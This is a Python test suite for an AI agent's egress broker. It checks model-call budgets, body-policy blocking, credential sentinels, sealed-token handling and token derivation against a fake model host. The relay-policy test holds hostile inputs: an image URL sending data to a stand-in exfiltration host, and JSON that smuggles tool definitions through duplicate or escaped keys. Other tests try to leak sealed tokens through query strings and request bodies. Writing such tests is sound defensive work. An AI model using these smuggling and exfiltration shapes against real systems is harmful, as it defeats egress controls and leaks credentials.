"""Model hosts through the tab's broker (secure-agentic plan 4.3/4.4): probes A9 (budget)
and A22 (body policy), and sealed agent-host tokens never forwarded (A25, broker side).
The fake model API is the test upstream at model.example.test; credentials are canaries."""

import base64
import json
import os

FAKE = {"id": "fake", "hosts": ["model.example.test"],
        "endpoints": [{"path": "/v1/chat/completions", "methods": ["POST"]}, {"path": "/v1/models", "methods": ["GET"]}],
        "fields": ["model", "messages", "tools", "stream"], "toolTypes": ["function"]}
CRED = {"id": "fake-model", "inject": {"header": "Authorization", "fmt": "Bearer {value}"},
        "bind": [{"host": "model.example.test", "path": "/v1/**", "methods": ["GET", "POST"]}]}
# An agent-host token sealed to an advertised key (inert marker, not a real token format).
SEALED = "copilot-sealed.v1.AAAA"
SEALED_AUTH = "Authorization: Bearer " + SEALED


def setup(pod, ctl, budget=None):
    models = {"providers": [FAKE], **({"budget": budget} if budget else {})}
    s = pod.load({"allow": [{"host": "model.example.test"}], "credentials": [CRED], "models": models,
                  "prompt": {"enabled": False}})["fake-model"]
    ctl.call("credential.provide", {"id": "fake-model", "value": pod.canaries["api"]})
    return s


def post(pod, s, body, *extra, raw=False):
    data = body if raw else json.dumps(body)
    return pod.curl("https://model.example.test/v1/chat/completions", "-X", "POST",
                    "-H", f"Authorization: Bearer {s}", "-H", "Content-Type: application/json",
                    *extra, "--data-binary", data)


def test_model_call_allowed_audited_and_budgeted(pod, ctl):
    s = setup(pod, ctl, budget={"requests": 2})
    mark = ctl.mark()
    r = post(pod, s, {"model": "m", "messages": [{"role": "user", "content": "hi"}],
                      "tools": [{"type": "function", "function": {"name": "f"}}]})
    assert r.code == 200 and r.json()["path"] == "/v1/chat/completions"
    call = ctl.wait_note("audit.event", lambda e: e["type"] == "model.call", since=mark, timeout=10)
    assert call["provider"] == "fake" and call["status"] == 200 and call["reqBytes"] > 0 and call["respBytes"] > 0
    assert call["tools"] == ["function"] and "durationMs" in call
    assert pod.curl("https://model.example.test/v1/models", "-H", f"Authorization: Bearer {s}").code == 200
    # A9: over budget is denied with 429, never prompted.
    r = post(pod, s, {"model": "m", "messages": []})
    assert r.code == 429 and "budget" in r.body
    ctl.wait_note("audit.event", lambda e: e["type"] == "model.budget_exceeded", since=mark, timeout=10)
    assert ctl.notes_since(mark, "approval.requested") == []
    assert ctl.call("health")["models"]["requests"] == 2


def test_a22_relay_shapes_denied_before_upstream(pod, ctl):
    s = setup(pod, ctl)
    seen_before = len(pod.seen())
    mark = ctl.mark()
    cases = [
        post(pod, s, {"model": "m", "messages": [], "tools": [{"type": "mcp", "server_url": "https://x.example.test"}]}),
        post(pod, s, {"model": "m", "messages": [], "web_search_options": {}}),
        post(pod, s, '{"model":"m","tools":[{"type":"function"}],"tools":[{"type":"mcp"}]}', raw=True),
        post(pod, s, '{"model":"m","\\u0074ools":[{"type":"mcp"}]}', raw=True),
        post(pod, s, {"model": "m"}, "-H", "Content-Encoding: gzip"),
        pod.curl("https://model.example.test/v1/chat/completions", "-X", "POST", "-H", f"Authorization: Bearer {s}",
                 "-H", "Content-Type: text/plain", "--data-binary", '{"model":"m"}'),
        pod.curl("https://model.example.test/v1/files", "-H", f"Authorization: Bearer {s}"),
        pod.curl("https://model.example.test/v1/models", "-H", f"Authorization: Bearer {s}",
                 "-H", "Connection: Upgrade", "-H", "Upgrade: websocket", "-H", "Sec-WebSocket-Version: 13",
                 "-H", "Sec-WebSocket-Key: " + base64.b64encode(os.urandom(16)).decode()),
        # Review round 7: content the provider would fetch is a relay without any tool.
        post(pod, s, {"model": "m", "messages": [{"role": "user", "content": [
            {"type": "image_url", "image_url": {"url": "https://exfil.example.test/c.png?d=x"}}]}]}),
        post(pod, s, '{"model":"m","tools":[{"type":"function","Type":"mcp"}]}', raw=True),
    ]
    assert [c.code for c in cases] == [403] * len(cases), [c.body for c in cases]
    denied = [e for e in ctl.notes_since(mark, "audit.event") if e["type"] == "model.denied"]
    assert len(denied) == len(cases) and all("untrusted" in e for e in denied)
    assert len(pod.seen()) == seen_before  # nothing reached the model host


def test_model_host_credentials_are_sentinels_only(pod, ctl):
    setup(pod, ctl)
    r = post(pod, "tab-held-key-" + "Z" * 32, {"model": "m", "messages": []})
    assert r.code == 403 and "sentinel" in r.body
    # Review round 7: a tab-held key in another header or the query string.
    for extra in (["-H", "x-goog-api-key: tab-held-key-ZZZZ"], []):
        url = "https://model.example.test/v1/models" + ("" if extra else "?key=tab-held-key-ZZZZ")
        r = pod.curl(url, *extra)
        assert r.code == 403 and "sentinel" in r.body
    # A25 (broker side): a token sealed for the agent host is never forwarded anywhere.
    pod.load({"allow": [{"host": "model.example.test"}, {"host": "api.example.test"}],
              "models": {"providers": [FAKE]}, "prompt": {"enabled": False}})
    for host in ("model.example.test", "api.example.test"):
        r = pod.curl(f"https://{host}/v1/models", "-H", SEALED_AUTH)
        assert r.code == 403 and "sealed" in r.body
    r = pod.curl("https://api.example.test/echo/x?t=" + SEALED)
    assert r.code == 403 and "sealed" in r.body
    r = pod.curl("https://api.example.test/echo/x", "-X", "POST", "--data-binary", SEALED)
    assert r.code == 403 and "sealed" in r.body


def test_body_policy_applies_only_to_model_hosts(pod, ctl):
    """A host that is neither declared nor on the known model-host list is plain egress;
    declaring it as a provider puts it under the body policy. (Known hosts without a
    provider are covered by unit tests: fixtures never reach real model hosts.)"""
    pod.load({"allow": [{"host": "model.example.test"}], "prompt": {"enabled": False}})
    assert pod.curl("https://model.example.test/v1/files").code == 200
    pod.load({"allow": [{"host": "model.example.test"}], "models": {"providers": [FAKE]},
              "prompt": {"enabled": False}})
    assert pod.curl("https://model.example.test/v1/files").code == 403


# ---- trusted derivation (secure-agentic D7) ---------------------------------------------

PARENT = {"id": "gh", "inject": {"header": "Authorization", "fmt": "token {value}"},
          "bind": [{"host": "api.example.test", "path": "/mint", "methods": ["POST"]},
                   {"host": "api.example.test", "path": "/echo/plain", "methods": ["GET"]}],
          "derive": [{"id": "copilot", "from": {"host": "api.example.test", "path": "/mint", "method": "POST"},
                      "field": "token", "inject": {"header": "Authorization", "fmt": "Bearer {value}"},
                      "bind": [{"host": "model.example.test", "path": "/v1/chat/completions", "methods": ["POST"]}]}]}


def setup_derive(pod, ctl):
    s = pod.load({"allow": [{"host": "model.example.test"}, {"host": "api.example.test"}],
                  "credentials": [PARENT], "models": {"providers": [FAKE]}, "prompt": {"enabled": False}})["gh"]
    ctl.call("credential.provide", {"id": "gh", "value": pod.canaries["git"]})
    return s


def test_trusted_derivation_binds_child_where_the_controller_said(pod, ctl):
    s = setup_derive(pod, ctl)
    mark = ctl.mark()
    r = pod.curl("https://api.example.test/mint", "-X", "POST", "-H", f"Authorization: token {s}")
    assert r.code == 201
    child = r.json()["token"]
    assert child.startswith("SECLAB_SNTL_") and "ghs_" not in r.body
    note = ctl.wait_note("credential.derived", since=mark)
    assert note == {"id": "gh.copilot", "parentId": "gh", "rule": "derive:copilot", "sentinel": child}
    # The child works on the declared model route, with the real minted token injected...
    r = post(pod, child, {"model": "m", "messages": []})
    assert r.code == 200 and r.json()["auth_is_minted"] is True
    # ...and nowhere else: not on the parent's host, not on another model path.
    assert pod.curl("https://api.example.test/echo/plain", "-H", f"Authorization: Bearer {child}").code == 403
    assert pod.curl("https://model.example.test/v1/models", "-H", f"Authorization: Bearer {child}").code == 403
    # A re-mint keeps the child's sentinel and swaps its value.
    r = pod.curl("https://api.example.test/mint", "-X", "POST", "-H", f"Authorization: token {s}")
    assert r.json()["token"] == child
    assert post(pod, child, {"model": "m", "messages": []}).json()["auth_is_minted"] is True


def test_trusted_derivation_fails_closed(pod, ctl):
    """On the declared route, a 2xx response that is not a strict JSON object with a string
    token field is blocked, so a format change can never pass the real value through."""
    rule = dict(PARENT["derive"][0], **{"from": {"host": "api.example.test", "path": "/echo/plain",
                                                 "method": "GET"}})
    parent = dict(PARENT, derive=[rule])
    s = pod.load({"allow": [{"host": "api.example.test"}, {"host": "model.example.test"}],
                  "credentials": [parent], "models": {"providers": [FAKE]}, "prompt": {"enabled": False}})["gh"]
    ctl.call("credential.provide", {"id": "gh", "value": pod.canaries["git"]})
    mark = ctl.mark()
    r = pod.curl("https://api.example.test/echo/plain", "-H", f"Authorization: token {s}")
    assert r.code == 502 and "derivation" in r.body
    ctl.wait_note("audit.event", lambda e: e["type"] == "response.blocked" and "derivation" in e["reason"],
                  since=mark, timeout=10)


def test_backstop_exempts_only_a_declared_derive_route(pod, ctl):
    """A provider-backstopped mint endpoint (here /user/keys under provider github) is
    reachable with the credential only on the exact route a derive rule declares, and its
    response must then yield a structurally replaced token or be blocked. Other backstopped
    routes stay denied (test_provider_backstop_beats_binding)."""
    rule = {"id": "mint", "from": {"host": "api.example.test", "path": "/user/keys", "method": "POST"},
            "field": "token", "inject": {"header": "Authorization", "fmt": "Bearer {value}"},
            "bind": [{"host": "model.example.test", "path": "/v1/chat/completions", "methods": ["POST"]}]}
    parent = dict(PARENT, provider="github", derive=[rule],
                  bind=[{"host": "api.example.test", "path": "/user/keys", "methods": ["POST"]}])
    s = pod.load({"allow": [{"host": "api.example.test"}, {"host": "model.example.test"}],
                  "credentials": [parent], "models": {"providers": [FAKE]}, "prompt": {"enabled": False}})["gh"]
    ctl.call("credential.provide", {"id": "gh", "value": pod.canaries["git"]})
    mark = ctl.mark()
    r = pod.curl("https://api.example.test/user/keys", "-X", "POST", "-H", f"Authorization: token {s}", "-d", "{}")
    assert r.code == 502 and "derivation" in r.body  # reached upstream, response had no token: blocked
    ctl.wait_note("audit.event", lambda e: e["type"] == "credential.backstop_exempt", since=mark, timeout=10)
